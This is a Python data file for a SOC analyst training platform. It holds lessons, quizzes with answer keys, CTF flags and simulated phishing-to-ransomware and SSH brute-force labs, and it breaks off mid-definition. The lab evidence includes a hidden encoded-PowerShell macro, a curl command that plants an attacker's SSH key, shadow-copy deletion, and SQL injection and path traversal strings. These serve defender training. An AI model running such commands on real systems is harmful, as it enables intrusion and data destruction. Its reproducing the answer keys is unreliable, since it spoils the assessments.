import json
import random
from datetime import timedelta
from pathlib import Path
from core import now
from labs_data import NEW_LABS
from practice_extra import NET_LINUX_LABS, NET_LINUX_CHALLENGES, EXTRA_QUIZZES


def L(id, title, content, video="", minutes=10, resources=None):
    return {"id": id, "title": title, "content": content, "video_url": video, "minutes": minutes,
            "resources": resources or [{"name": f"{title} cheat-sheet.txt", "url": f"/api/resources/{id}.txt"}]}


YT = "https://www.youtube.com/embed/inWWhr5tnEA"

PATHS = [
    {"id": "soc-fundamentals", "title": "SOC Fundamentals", "level": "Beginner", "category": "Foundations", "order": 1,
     "description": "How a Security Operations Center works: people, process, tooling, the alert lifecycle and the core networking + OS knowledge every analyst needs.",
     "modules": [
         {"id": "sf-m1", "title": "Inside the SOC", "lessons": [
             L("sf-l1", "What a SOC Actually Does", "A Security Operations Center continuously monitors, detects, investigates and responds to threats.\n\nKey functions:\n- Monitoring: SIEM, EDR and NDR telemetry is watched 24/7.\n- Triage: L1 analysts validate alerts and separate true positives from noise.\n- Investigation: L2 analysts scope incidents and correlate across sources.\n- Response: containment, eradication, recovery.\n\nMetrics you will hear daily: MTTD (mean time to detect), MTTR (mean time to respond), false-positive rate and alert volume per analyst.", YT),
             L("sf-l2", "Tiers, Shifts and Escalation", "SOC teams are usually tiered.\n\n- L1: triage queue, playbook execution, ticket hygiene.\n- L2: deep investigation, threat hunting, tuning detections.\n- L3 / IR: forensics, malware analysis, incident command.\n\nEscalate when: impact is confirmed, scope is unclear, a privileged account is involved, or a playbook says so. Always document what you checked before escalating."),
             L("sf-l3", "The Alert Lifecycle", "1. Detection rule fires\n2. Alert lands in queue with severity\n3. Analyst triages: context, enrichment, verdict\n4. True Positive -> case opened, escalated\n5. False Positive -> closed with reason, tuning ticket\n\nGood triage notes answer: What happened? Who/what is affected? Is it malicious? What next?")]},
         {"id": "sf-m2", "title": "Core Telemetry", "lessons": [
             L("sf-l4", "Windows Event Logs 101", "Must-know Event IDs:\n- 4624 successful logon (check Logon Type: 2 interactive, 3 network, 10 RDP)\n- 4625 failed logon\n- 4688 process creation\n- 4720 user created, 4732 added to group\n- 7045 service installed\n- 1102 audit log cleared\n\nCorrelate 4625 bursts followed by 4624 from the same source = possible successful brute force."),
             L("sf-l5", "Network Logs: Firewall, Proxy, DNS", "Firewall logs show allow/deny decisions with 5-tuple data.\nProxy logs reveal URLs, user agents and categories.\nDNS logs expose domain lookups — beaconing malware often resolves algorithmically generated or newly registered domains.\n\nTip: rare destinations + regular intervals = beacon candidate.")]},
     ]},
    {"id": "soc-l1", "title": "SOC L1 Analyst", "level": "Beginner", "category": "Analyst", "order": 2,
     "description": "Hands-on alert triage: phishing, malware, brute force and web attacks. Learn enrichment, verdicts and clean escalation notes.",
     "modules": [
         {"id": "l1-m1", "title": "Phishing Triage", "lessons": [
             L("l1-l1", "Reading Email Headers", "Focus fields: From vs Return-Path mismatch, Received chain (bottom-up), SPF/DKIM/DMARC results, Reply-To tricks and X-Originating-IP.\n\nA DMARC=fail with a lookalike domain (rnicrosoft.com) is a strong phishing signal.", YT),
             L("l1-l2", "URL and Attachment Analysis", "Never click. Defang URLs (hxxp://evil[.]com). Use reputation lookups, sandbox detonation and check file hashes. Macro-enabled documents (.docm, .xlsm) and ISO/LNK chains are common initial access vectors.")]},
         {"id": "l1-m2", "title": "Endpoint & Auth Alerts", "lessons": [
             L("l1-l3", "Brute Force & Password Spraying", "Brute force: many passwords, one account. Spraying: one password, many accounts.\nIndicators: 4625 bursts, sub-status 0xC000006A (bad password), 0xC0000064 (no such user). Check if any 4624 follows from the same IP."),
             L("l1-l4", "Suspicious Process Trees", "Red flags: winword.exe -> powershell.exe, encoded commands (-enc), rundll32 with unusual DLL paths, certutil -urlcache downloads, mshta pulling remote HTA.")]},
     ]},
    {"id": "soc-l2", "title": "SOC L2 Analyst", "level": "Intermediate", "category": "Analyst", "order": 3,
     "description": "Deep investigations, correlation across telemetry, threat hunting with hypotheses and detection engineering basics.",
     "modules": [
         {"id": "l2-m1", "title": "Correlation & Hunting", "lessons": [
             L("l2-l1", "Hypothesis-Driven Hunting", "Start with a hypothesis mapped to MITRE ATT&CK (e.g., T1053 scheduled tasks for persistence). Define data sources, build the query, baseline normal, investigate outliers, document findings and convert to a detection."),
             L("l2-l2", "Lateral Movement Detection", "Signals: 4624 Logon Type 3 from workstations to many hosts, 7045 PSEXESVC service, admin share access (\\\\host\\ADMIN$), WMI remote process creation, RDP chains.")]},
         {"id": "l2-m2", "title": "Detection Engineering", "lessons": [
             L("l2-l3", "Writing Quality Detections", "A good rule is specific, tested and documented: describe the behavior, data source, false-positive notes and response steps. Measure precision and tune continuously.")]},
     ]},
    {"id": "incident-response", "title": "Incident Response", "level": "Advanced", "category": "Response", "order": 4,
     "description": "Run incidents end-to-end with the PICERL lifecycle: preparation, identification, containment, eradication, recovery and lessons learned.",
     "modules": [
         {"id": "ir-m1", "title": "IR Lifecycle", "lessons": [
             L("ir-l1", "PICERL in Practice", "Preparation: playbooks, contacts, tooling.\nIdentification: confirm and scope.\nContainment: short-term (isolate host) and long-term.\nEradication: remove persistence and artifacts.\nRecovery: restore and monitor.\nLessons learned: blameless review within two weeks.", YT),
             L("ir-l2", "Ransomware Response", "Isolate affected hosts immediately, preserve volatile evidence, identify patient zero, check for shadow copy deletion (vssadmin delete shadows), find exfiltration, reset credentials and restore from known-good backups.")]},
     ]},
    {"id": "interview-prep", "title": "SOC Interview Preparation", "level": "All levels", "category": "Career", "order": 5,
     "description": "Common SOC interview questions, scenario walkthroughs, resume tips and how to talk about your home lab.",
     "modules": [
         {"id": "ip-m1", "title": "Technical Interview", "lessons": [
             L("ip-l1", "Top 25 SOC Questions", "Expect: TCP handshake, common ports, difference between IDS/IPS, what is a SIEM, explain a phishing investigation, CIA triad, hashing vs encryption, what is lateral movement, how do you handle a false positive."),
             L("ip-l2", "Scenario Walkthroughs", "Use the STAR-style structure: Situation, Triage steps, Actions, Result. Speak in evidence: 'I checked the proxy logs for the destination and found 14 connections in 2 minutes'.")]},
     ]},
]


def Q(id, type, text, options, answer, explanation, topic):
    return {"id": id, "type": type, "text": text, "options": options, "answer": answer, "explanation": explanation, "topic": topic}


TF = ["True", "False"]
QUESTION_BANK = [
    Q("q1", "mcq", "Which Windows Event ID indicates a failed logon?", ["4624", "4625", "4688", "7045"], [1], "4625 is logged for every failed authentication attempt.", "Windows Logs"),
    Q("q2", "mcq", "Logon Type 10 in event 4624 means:", ["Network", "Interactive", "RemoteInteractive (RDP)", "Service"], [2], "Type 10 = RemoteInteractive, i.e. RDP/Terminal Services.", "Windows Logs"),
    Q("q3", "multi", "Select ALL strong phishing indicators:", ["DMARC fail", "Lookalike sender domain", "Internal sender with SPF pass", "Urgent payment request"], [0, 1, 3], "DMARC failure, lookalike domains and urgency are classic phishing signals.", "Phishing"),
    Q("q4", "tf", "An IPS can block traffic, while an IDS only alerts.", TF, [0], "IPS sits inline and can drop packets; IDS is passive.", "Network"),
    Q("q5", "mcq", "Which command is commonly abused by ransomware to delete backups?", ["netstat -an", "vssadmin delete shadows", "ipconfig /all", "whoami"], [1], "Deleting volume shadow copies prevents easy recovery.", "Malware"),
    Q("q6", "mcq", "Regular outbound connections at fixed intervals to a rare domain suggest:", ["Patching", "Beaconing C2", "DNS caching", "NTP sync"], [1], "Periodic callbacks are characteristic of command-and-control beacons.", "Network"),
    Q("q7", "tf", "Hashing is reversible if you know the key.", TF, [1], "Hashes are one-way functions; encryption is reversible with a key.", "Fundamentals"),
    Q("q8", "multi", "Which are signs of lateral movement?", ["PSEXESVC service install", "Logon Type 3 to many hosts", "User changes wallpaper", "ADMIN$ share access"], [0, 1, 3], "Remote service creation, network logons across hosts and admin share access are typical.", "Lateral Movement"),
    Q("q9", "mcq", "In PICERL, isolating an infected host belongs to:", ["Identification", "Containment", "Recovery", "Lessons Learned"], [1], "Isolation limits spread — that is containment.", "Incident Response"),
    Q("q10", "mcq", "Default port for SMB:", ["21", "445", "3389", "53"], [1], "SMB runs over TCP 445.", "Network"),
    Q("q11", "tf", "Password spraying tries many passwords against a single account.", TF, [1], "That is brute force. Spraying uses one password against many accounts.", "Windows Logs"),
    Q("q12", "mcq", "winword.exe spawning powershell.exe -enc ... most likely indicates:", ["Normal update", "Malicious macro execution", "Printer driver", "User typo"], [1], "Office spawning encoded PowerShell is a textbook macro dropper.", "Malware"),
]


def quiz(id, title, topic, qids, time_limit=0, path_id=None, pass_mark=70):
    return {"id": id, "title": title, "topic": topic, "time_limit_sec": time_limit, "path_id": path_id, "pass_mark": pass_mark,
            "published": True, "questions": [q for q in QUESTION_BANK if q["id"] in qids]}


QUIZZES = [
    quiz("quiz-winlogs", "Windows Logs Essentials", "Windows Logs", ["q1", "q2", "q11"]),
    quiz("quiz-phish", "Phishing & Malware Signals", "Phishing", ["q3", "q5", "q12"], 180),
    quiz("quiz-net", "Network Defense Basics", "Network", ["q4", "q6", "q10"]),
    quiz("final-soc-fundamentals", "SOC Fundamentals — Final Exam", "Final", ["q1", "q4", "q7", "q10", "q6"], 600, "soc-fundamentals"),
    quiz("final-soc-l1", "SOC L1 — Final Exam", "Final", ["q1", "q2", "q3", "q11", "q12"], 600, "soc-l1"),
    quiz("final-soc-l2", "SOC L2 — Final Exam", "Final", ["q6", "q8", "q2", "q12"], 600, "soc-l2"),
    quiz("final-incident-response", "Incident Response — Final Exam", "Final", ["q5", "q9", "q8"], 600, "incident-response"),
    quiz("final-interview-prep", "Interview Prep — Final Exam", "Final", ["q4", "q7", "q10", "q9"], 600, "interview-prep"),
] + EXTRA_QUIZZES

CHALLENGES = [
    {"id": "ch-phish-01", "title": "Invoice Overdue — Urgent", "category": "Phishing", "severity": "High", "points": 100, "verdict": "TP",
     "description": "A finance user reported an email asking to review an overdue invoice. The mail gateway allowed delivery.",
     "alert": {"rule": "SOC101 - Suspicious Email Attachment", "time": "2026-06-02 09:14", "host": "FIN-WS-07", "user": "j.morris",
               "sender": "billing@paypa1-invoices.com", "subject": "Invoice #88213 overdue", "attachment": "Invoice_88213.docm",
               "sha256": "a3f5c9e1d2b47e8f0c6b5a4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f"},
     "evidence": ["Authentication-Results: spf=fail dkim=none dmarc=fail header.from=paypa1-invoices.com",
                  "Sandbox: Invoice_88213.docm -> WINWORD.EXE -> powershell.exe -nop -w hidden -enc SQBFAFgA...",
                  "Proxy: FIN-WS-07 GET http://185.220.101.45/stage2.bin 200 (category: uncategorized)",
                  "Intel: 185.220.101.45 listed on 12 blocklists"],
     "keywords": ["dmarc", "macro", "powershell", "185.220.101.45", "isolate", "block"]},
    {"id": "ch-bf-01", "title": "Multiple Failed Logons on VPN", "category": "Brute Force", "severity": "Medium", "points": 100, "verdict": "TP",
     "description": "Auth gateway alerted on 240 failed logons for one account within 5 minutes.",
     "alert": {"rule": "SOC112 - Brute Force Detected", "time": "2026-06-03 02:41", "host": "VPN-GW-01", "user": "a.kumar", "src_ip": "45.155.205.12"},
     "evidence": ["240 x EventID 4625 user=a.kumar src=45.155.205.12 substatus=0xC000006A", "1 x EventID 4624 user=a.kumar src=45.155.205.12 LogonType=10 at 02:46",
                  "Geo: 45.155.205.12 -> hosting provider, no prior history for user", "User is on annual leave per HR calendar"],
     "keywords": ["4625", "4624", "successful", "reset", "password", "45.155.205.12", "mfa"]},
    {"id": "ch-mal-01", "title": "Scheduled Task Created by Admin Tool", "category": "Malware", "severity": "Low", "points": 80, "verdict": "FP",
     "description": "EDR flagged schtasks.exe creating a daily task on an IT server.",
     "alert": {"rule": "SOC134 - Persistence via Scheduled Task", "time": "2026-06-04 11:02", "host": "IT-SRV-02", "user": "svc_patch",
               "command": "schtasks /create /tn \"WSUS-Sync\" /tr C:\\Tools\\wsus_sync.ps1 /sc daily"},
     "evidence": ["Change ticket CHG-4471 approved: deploy WSUS sync task on IT-SRV-02", "wsus_sync.ps1 signed by internal IT code-signing cert",
                  "svc_patch is a documented patch-management service account", "No network connections to external hosts from the script"],
     "keywords": ["change", "ticket", "signed", "legitimate", "service account", "tuning"]},
    {"id": "ch-rw-01", "title": "Mass File Rename on File Server", "category": "Ransomware", "severity": "Critical", "points": 150, "verdict": "TP",
     "description": "File integrity monitoring reported 12,000 file renames to *.lockd within 3 minutes.",
     "alert": {"rule": "SOC145 - Ransomware Behavior", "time": "2026-06-05 03:12", "host": "FS-01", "user": "backup_admin",
               "process": "C:\\ProgramData\\svch0st.exe"},
     "evidence": ["4688: cmd.exe /c vssadmin delete shadows /all /quiet", "README_RESTORE.txt dropped in 340 folders",
                  "svch0st.exe unsigned, compiled 2 days ago", "4624 Type 3 backup_admin from WS-HR-03 at 03:05"],
     "keywords": ["isolate", "vssadmin", "shadow", "svch0st", "ws-hr-03", "credentials", "backup"]},
    {"id": "ch-lat-01", "title": "PsExec Service on Domain Controller", "category": "Lateral Movement", "severity": "High", "points": 120, "verdict": "TP",
     "description": "A new service PSEXESVC was installed on DC-01 from a workstation outside the admin VLAN.",
     "alert": {"rule": "SOC151 - Remote Service Installation", "time": "2026-06-05 22:30", "host": "DC-01", "user": "h.lee", "src_host": "WS-MKT-11"},
     "evidence": ["7045: Service PSEXESVC installed by h.lee", "h.lee is a marketing user, not a domain admin until 22:21 (4732 added to Domain Admins)",
                  "4720: user 'support01' created at 22:33", "WS-MKT-11 ran mimikatz-like binary 'm.exe' at 22:15"],
     "keywords": ["psexec", "4732", "domain admins", "support01", "mimikatz", "credential", "disable"]},
]
for _c in CHALLENGES:
    _c.setdefault("difficulty", {80: "Easy", 100: "Easy", 120: "Medium"}.get(_c["points"], "Hard"))
CHALLENGES += json.loads((Path(__file__).parent / "assets" / "challenges.json").read_text()) + NET_LINUX_CHALLENGES

CTFS = [
    {"id": "ctf-log-1", "writeup": "Brute force shows up as many 'Failed password' lines from one source in a few seconds. Here 45.155.205.12 fails twice in a row against a.kumar, while the only 'Accepted password' comes from an internal 10.x address for a different user. In a SOC you would check that IP in Threat Intel, look for a later success from it, and block it at the VPN or firewall.", "category": "Log Analysis", "title": "Who Knocked?", "points": 100, "flag": "45.155.205.12",
     "description": "The auth log below shows a brute force. Submit the attacker IP.\n\nJun 03 02:41:11 vpn sshd[211]: Failed password for a.kumar from 45.155.205.12 port 51122\nJun 03 02:41:12 vpn sshd[211]: Failed password for a.kumar from 45.155.205.12 port 51123\nJun 03 02:41:15 vpn sshd[214]: Accepted password for m.shah from 10.0.4.21 port 50110",
     "hints": [{"text": "Look for repeated 'Failed password' lines.", "cost": 20}]},
    {"id": "ctf-log-2", "writeup": "Windows writes Event ID 1102 ('The audit log was cleared') to the Security log whenever someone wipes it. Attackers clear logs to hide their tracks, so 1102 is a high-value alert on its own. Check who cleared it (Subject account) and what happened on that host just before.", "category": "Log Analysis", "title": "Cleared Tracks", "points": 200, "flag": "1102",
     "description": "An attacker cleared the Security log. Which Windows Event ID records this?",
     "hints": [{"text": "It's a four-digit ID starting with 11.", "cost": 40}]},
    {"id": "ctf-for-1", "writeup": "PowerShell's -enc flag normally takes base64 UTF-16LE, but this payload is plain base64. Decoding ZDNjMGQzZF9sMDB0 with the Decoder tool gives d3c0d3d_l00t. Always decode -enc payloads found in Run keys or process logs: they often hide download cradles or persistence.", "category": "Forensics", "title": "Hidden in Base64", "points": 150, "flag": "d3c0d3d_l00t",
     "description": "Recovered from a registry Run key:\npowershell -enc ZDNjMGQzZF9sMDB0\nThe -enc payload is plain base64 here. Decode it and submit the result.",
     "hints": [{"text": "Use the Decoder tool: From Base64.", "cost": 30}]},
    {"id": "ctf-net-1", "writeup": "Each connection is exactly one minute apart (10:00, 10:01, 10:02...), so the beacon interval is 60 seconds. Machine-regular timing to a rare domain is a classic sign of C2 beaconing; real users don't browse on a perfect clock. Hunt for the same interval from other hosts.", "category": "Network", "title": "Beacon Interval", "points": 150, "flag": "60",
     "description": "Proxy timestamps to cdn-update.top: 10:00:00, 10:01:00, 10:02:00, 10:03:00. What is the beacon interval in seconds?",
     "hints": [{"text": "Subtract consecutive timestamps.", "cost": 30}]},
    {"id": "ctf-net-2", "writeup": "Logon Type 10 in Event 4624 is RemoteInteractive, which means RDP, and RDP listens on TCP 3389. An inbound ALLOW on 3389 from the internet, followed by a type 10 logon, means someone logged in over exposed RDP. Close 3389 to the internet and put RDP behind a VPN.", "category": "Network", "title": "Port of Call", "points": 100, "flag": "3389",
     "description": "Firewall shows inbound ALLOW tcp/? to an exposed server and then 4624 LogonType 10. Which port?",
     "hints": [{"text": "Logon type 10 = RDP.", "cost": 20}]},
    {"id": "ctf-mal-1", "writeup": "Running the hash through Threat Intel identifies the ransomware family and its behaviour, including the .lockd extension it adds to encrypted files. Knowing the extension lets you search file-server logs and EDR for mass renames to *.lockd to scope which hosts were hit.", "category": "Malware", "title": "Hash Hunt", "points": 200, "flag": "lockd",
     "description": "Look up hash 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 in the Threat Intel lookup tool. What file extension does this ransomware family append?",
     "hints": [{"text": "Tools > Intel Lookup shows the family details.", "cost": 40}]},
    {"id": "ctf-web-1", "writeup": "UNION SELECT, a closing quote and a trailing comment (--) in a URL parameter are textbook SQL injection, or sqli. The WAF returned 403 so this attempt was blocked, but check for other requests from the same source that got a 200.", "category": "Web", "title": "Injected", "points": 150, "flag": "sqli",
     "description": "WAF log: GET /products?id=1' UNION SELECT username,password FROM users-- 403. What attack class is this (short name, lowercase)?",
     "hints": [{"text": "Four letters, starts with 'sql'.", "cost": 30}]},
    {"id": "ctf-web-2", "writeup": "Repeated ../ sequences mean path traversal: the attacker climbs out of the web root to read /etc/passwd, the classic Linux user list. A 200 response means the read probably worked. Fix the file parameter's validation and check what else that IP requested.", "category": "Web", "title": "Path Walker", "points": 100, "flag": "/etc/passwd",
     "description": "GET /download?file=../../../../etc/passwd 200. Which file was the attacker after? Submit the full path.",
     "hints": [{"text": "It's the classic Linux user list.", "cost": 20}]},
]

PHISH_FS = {
    "/home/analyst/README.txt": "Case: Phishing to Ransomware (INC-2026-0612)\nEvidence is in ~/evidence. Use the tools to answer the lab tasks.\n",
    "/home/analyst/evidence/email.eml": "Return-Path: <bounce@mail-paypa1.com>\nReceived: from mx.mail-paypa1.com (91.243.44.10)\nFrom: \"Accounts\" <billing@paypa1-invoices.com>\nTo: j.morris@acme-corp.local\nSubject: Invoice #88213 overdue\nAuthentication-Results: spf=fail dkim=none dmarc=fail\nX-Originating-IP: 91.243.44.10\n\nPlease review the attached invoice today to avoid late fees.\nAttachment: Invoice_88213.docm\n",
    "/home/analyst/evidence/macro.txt": "Sub AutoOpen()\n  Shell \"powershell -nop -w hidden -enc aHR0cDovLzE4NS4yMjAuMTAxLjQ1L3N0YWdlMi5iaW4=\"\nEnd Sub\n",
    "/home/analyst/evidence/proxy.log": "2026-06-12 09:15:02 FIN-WS-07 GET http://185.220.101.45/stage2.bin 200 482113\n2026-06-12 09:16:00 FIN-WS-07 POST http://cdn-update.top/gate.php 200 312\n2026-06-12 09:17:00 FIN-WS-07 POST http://cdn-update.top/gate.php 200 309\n2026-06-12 09:18:00 FIN-WS-07 POST http://cdn-update.top/gate.php 200 311\n2026-06-12 09:20:11 FIN-WS-07 GET https://www.office.com/ 200 9921\n",
    "/home/analyst/evidence/security.log": "2026-06-12 09:40:10 FIN-WS-07 4688 powershell.exe -enc ...\n2026-06-12 10:02:44 FS-01 4624 LogonType=3 user=j.morris src=FIN-WS-07\n2026-06-12 10:05:13 FS-01 4688 cmd.exe /c vssadmin delete shadows /all /quiet\n2026-06-12 10:05:20 FS-01 4688 C:\\ProgramData\\svch0st.exe --encrypt \\\\FS-01\\shares\n",
    "/home/analyst/evidence/stage2.bin": "MZ\x90\x00 This program cannot be run in DOS mode. LockdCrypt v2 .lockd README_RESTORE.txt http://cdn-update.top/gate.php",
    "/home/analyst/evidence/capture.pcap": "PCAP",
    "/home/analyst/evidence/hashes.txt": "backup_admin:5f4dcc3b5aa765d61d8327deb882cf99\n",
    "/home/analyst/notes.md": "# My notes\n",
}

PHISH_LAB = {
    "id": "lab-phish-ransom", "title": "Phishing to Ransomware", "difficulty": "Intermediate", "duration": "60 min", "published": True,
    "description": "A finance user opened a malicious invoice. Two hours later the file server started encrypting. Reconstruct the kill chain from email to encryption.",
    "category": "Ransomware",
    "scenario": "09:40 — the helpdesk escalates a call: files on \\\\FS-01\\shares are being renamed to .lockd and a README_RESTORE.txt appeared. Finance reported a strange invoice email this morning. You are the on-shift L2. Evidence from the mail gateway, proxy, Windows logs and a password dump is in ~/evidence.",
    "report_guide": "Cover: initial access, payload, C2, lateral movement, impact, IOCs, and containment/recovery steps.",
    "report_keywords": ["phishing", "macro", "powershell", "185.220.101.45", "cdn-update.top", "svch0st.exe", "fs-01", "isolate", "backup", "reset"],
    "tasks": [
        {"id": "t1", "phase": "Initial Access", "title": "Sender IP", "question": "What is the sending IP (X-Originating-IP) of the phishing email?", "answer": "91.243.44.10", "hint": "cat ~/evidence/email.eml"},
        {"id": "t1b", "phase": "Initial Access", "type": "mcq", "title": "Lure type", "question": "Which ATT&CK technique best describes the initial access?", "options": ["T1566.001 Spearphishing Attachment", "T1190 Exploit Public-Facing Application", "T1078 Valid Accounts", "T1133 External Remote Services"], "answer": "T1566.001 Spearphishing Attachment", "hint": "The email carried a .docm invoice"},
        {"id": "t2", "phase": "Execution & C2", "title": "Payload", "question": "Decode the macro's base64. Which IP hosted stage2?", "answer": "185.220.101.45", "hint": "base64 -d the -enc string, or use the Decoder tool"},
        {"id": "t3", "phase": "Execution & C2", "title": "Command & control", "question": "Which domain received regular beacons?", "answer": "cdn-update.top", "hint": "grep POST ~/evidence/proxy.log"},
        {"id": "t4", "phase": "Impact", "title": "Encryptor", "question": "Which binary performed the encryption on FS-01?", "answer": "svch0st.exe", "hint": "grep FS-01 ~/evidence/security.log"},
        {"id": "t5", "phase": "Impact", "title": "Credentials", "question": "Crack backup_admin's MD5 hash. What is the password?", "answer": "password", "hint": "john ~/evidence/hashes.txt"},
        {"id": "t6", "phase": "Response", "type": "mcq", "title": "First containment move", "question": "Encryption is still running on FS-01. What do you do first?", "options": ["Isolate FS-01 and FIN-WS-07 from the network via EDR", "Power off every server immediately", "Email the attacker to negotiate", "Wait for the backup job tonight"], "answer": "Isolate FS-01 and FIN-WS-07 from the network via EDR", "hint": "Keep memory evidence, stop the spread"},
    ],
    "kali": {
        "fs": PHISH_FS,
        "net": {
            "whois": {"paypa1-invoices.com": "Domain Name: PAYPA1-INVOICES.COM\nRegistrar: NameSilo, LLC\nCreation Date: 2026-06-10T04:11:22Z\nRegistrant Country: RU\nName Server: NS1.BULLETHOST.NET",
                      "cdn-update.top": "Domain Name: cdn-update.top\nCreation Date: 2026-06-09T18:00:01Z\nRegistrar: Shinjiru Technology\nStatus: clientTransferProhibited"},
            "dns": {"cdn-update.top": "185.220.101.45", "paypa1-invoices.com": "91.243.44.10", "acme-corp.local": "10.0.0.5"},
            "nmap": {"10.0.0.21": "PORT     STATE SERVICE\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server",
                     "185.220.101.45": "PORT    STATE SERVICE\n80/tcp  open  http\n443/tcp open  https\n9001/tcp open tor-orport"},
            "curl": {"cdn-update.top": "<html><body>404 Not Found</body></html>"},
        },
        "pcap": "1  0.000  10.0.4.17 -> 185.220.101.45 TCP 51544 -> 80 [SYN]\n2  0.120  10.0.4.17 -> 185.220.101.45 HTTP GET /stage2.bin\n3  58.10  10.0.4.17 -> 185.220.101.45 HTTP POST /gate.php (Host: cdn-update.top)\n4  118.1  10.0.4.17 -> 185.220.101.45 HTTP POST /gate.php (Host: cdn-update.top)\n5  178.1  10.0.4.17 -> 10.0.0.21 SMB2 Tree Connect \\\\FS-01\\shares",
        "cracked": {"5f4dcc3b5aa765d61d8327deb882cf99": "password"},
    },
}

BRUTE_LAB = {
    "id": "lab-bruteforce", "title": "Linux SSH Brute Force", "difficulty": "Beginner", "duration": "30 min", "published": True,
    "description": "A public jump host shows thousands of SSH failures. Determine the attacker, whether they got in, and what they did.",
    "category": "Brute Force",
    "scenario": "Monitoring flagged 18 SSH failures in under a minute on the public jump host, followed by silence. Silence after a burst is never good news. Work out who attacked, whether they got in and what they left behind.",
    "report_guide": "Cover: attacker IP, targeted accounts, the successful login, persistence, and response (block, key removal, password reset).",
    "report_keywords": ["45.155.205.12", "brute force", "deploy", "accepted", "authorized_keys", "block", "reset", "mfa"],
    "tasks": [
        {"id": "t1", "phase": "Detection", "title": "Attacker", "question": "Which IP generated the most failed passwords?", "answer": "45.155.205.12", "hint": "grep Failed ~/auth.log"},
        {"id": "t1b", "phase": "Detection", "type": "mcq", "title": "Pattern", "question": "One IP tried root, admin, deploy and ubuntu repeatedly. What is this?", "options": ["Brute force / dictionary attack", "Password spray across thousands of tenants", "Pass-the-hash", "Kerberoasting"], "answer": "Brute force / dictionary attack", "hint": "Same source, few accounts, many tries"},
        {"id": "t2", "phase": "Investigation", "title": "Success?", "question": "Which username was successfully compromised?", "answer": "deploy", "hint": "grep Accepted ~/auth.log"},
        {"id": "t3", "phase": "Investigation", "title": "Persistence", "question": "What file did the attacker modify for persistence? (full path)", "answer": "/home/deploy/.ssh/authorized_keys", "hint": "cat ~/bash_history_deploy"},
        {"id": "t4", "phase": "Response", "type": "mcq", "title": "Response", "question": "Which response fully removes the attacker's access?", "options": ["Remove the attacker key from authorized_keys, reset deploy's password and block the IP", "Only block the IP", "Only reset the password", "Reboot the jump host"], "answer": "Remove the attacker key from authorized_keys, reset deploy's password and block the IP", "hint": "They have a password AND a key"},
    ],
    "kali": {"fs": {
        "/home/analyst/auth.log": "\n".join([f"Jun 08 03:1{i%10}:0{i%10} jump sshd[90{i}]: Failed password for {u} from 45.155.205.12 port 5{i}11 ssh2" for i, u in enumerate(["root", "admin", "deploy", "root", "ubuntu", "deploy"] * 3)]) +
        "\nJun 08 03:22:41 jump sshd[9911]: Accepted password for deploy from 45.155.205.12 port 60122 ssh2\nJun 08 04:00:00 jump sshd[9950]: Accepted publickey for m.shah from 10.0.4.21 port 50001 ssh2\n",
        "/home/analyst/bash_history_deploy": "whoami\nuname -a\ncurl -s http://45.155.205.12/k.pub >> /home/deploy/.ssh/authorized_keys\ncrontab -l\nhistory -c\n",
        "/home/analyst/README.txt": "Investigate auth.log and bash_history_deploy.\n"},
        "net": {"whois": {"45.155.205.12": "NetRange: 45.155.205.0 - 45.155.205.255\nOrgName: Bulletproof Hosting Ltd\nCountry: NL"}, "dns": {}, "nmap": {}, "curl": {}},
        "pcap": "No capture loaded.", "cracked": {}},
}

LABS = [PHISH_LAB, BRUTE_LAB] + NEW_LABS + NET_LINUX_LABS

INTEL = {
    "185.220.101.45": {"type": "ip", "verdict": "malicious", "detections": "12/90", "tags": ["c2", "tor-exit", "malware-hosting"], "country": "DE", "asn": "AS60729", "first_seen": "2025-11-02"},
    "45.155.205.12": {"type": "ip", "verdict": "malicious", "detections": "9/90", "tags": ["bruteforce", "scanner"], "country": "NL", "asn": "AS48693", "first_seen": "2026-01-14"},
    "91.243.44.10": {"type": "ip", "verdict": "suspicious", "detections": "4/90", "tags": ["phishing", "smtp"], "country": "RU", "asn": "AS44477", "first_seen": "2026-06-10"},
    "8.8.8.8": {"type": "ip", "verdict": "clean", "detections": "0/90", "tags": ["google-dns"], "country": "US", "asn": "AS15169", "first_seen": "2014-01-01"},
    "cdn-update.top": {"type": "domain", "verdict": "malicious", "detections": "14/90", "tags": ["c2", "newly-registered"], "registrar": "Shinjiru", "first_seen": "2026-06-09"},
    "paypa1-invoices.com": {"type": "domain", "verdict": "malicious", "detections": "11/90", "tags": ["phishing", "typosquat"], "registrar": "NameSilo", "first_seen": "2026-06-10"},
    "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08": {"type": "hash", "verdict": "malicious", "detections": "61/72", "family": "LockdCrypt", "tags": ["ransomware", "appends .lockd"], "file_name": "svch0st.exe", "first_seen": "2026-06-03"},
    "a3f5c9e1d2b47e8f0c6b5a4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f": {"type": "hash", "verdict": "malicious", "detections": "38/72", "family": "Emotet-like dropper", "tags": ["macro", "docm"], "file_name": "Invoice_88213.docm", "first_seen": "2026-06-01"},
}

SANDBOX = [
    {"id": "sbx-1", "file": "Invoice_88213.docm", "sha256": "a3f5c9e1d2b47e8f0c6b5a4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f", "score": 92, "verdict": "malicious",
     "processes": ["WINWORD.EXE (pid 4120)", "  └ powershell.exe -nop -w hidden -enc ... (pid 5032)", "     └ rundll32.exe C:\\Users\\Public\\s2.dll,Start (pid 5310)"],
     "network": ["GET http://185.220.101.45/stage2.bin", "POST http://cdn-update.top/gate.php (every 60s)"],
     "files": ["C:\\Users\\Public\\s2.dll", "C:\\ProgramData\\svch0st.exe"], "mitre": ["T1566.001 Spearphishing Attachment", "T1059.001 PowerShell", "T1071.001 Web Protocols"]},
    {"id": "sbx-2", "file": "svch0st.exe", "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "score": 99, "verdict": "malicious",
     "processes": ["svch0st.exe --encrypt (pid 7001)", "  └ cmd.exe /c vssadmin delete shadows /all /quiet (pid 7011)"],
     "network": ["SMB \\\\FS-01\\shares"], "files": ["*.lockd (mass rename)", "README_RESTORE.txt"], "mitre": ["T1486 Data Encrypted for Impact", "T1490 Inhibit System Recovery"]},
]

THREAT_FEED = [
